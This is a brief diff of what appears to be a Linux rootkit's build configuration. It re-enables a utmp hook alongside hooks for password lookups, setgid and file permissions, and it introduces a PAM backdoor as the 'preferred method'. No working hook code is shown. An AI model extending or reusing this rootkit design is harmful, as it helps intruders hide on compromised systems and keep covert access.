@@ -20,7 +20,7 @@
 "pwd/pwd.h" # pwd-struct related hooks (getpwnam, etc)
 "gid/gid.h" # setgid safety net
 "perms/perms.h" # file permission hooks
-#"utmp/utmp.h" # i think the utmp struct has been changed since i have last worked on anything like this
+"utmp/utmp.h" # i think the utmp struct has been changed since i have last worked on anything like this
 
 # pam backdoor header file.
 # afaik, the pam backdoor method is the preferred method for most people
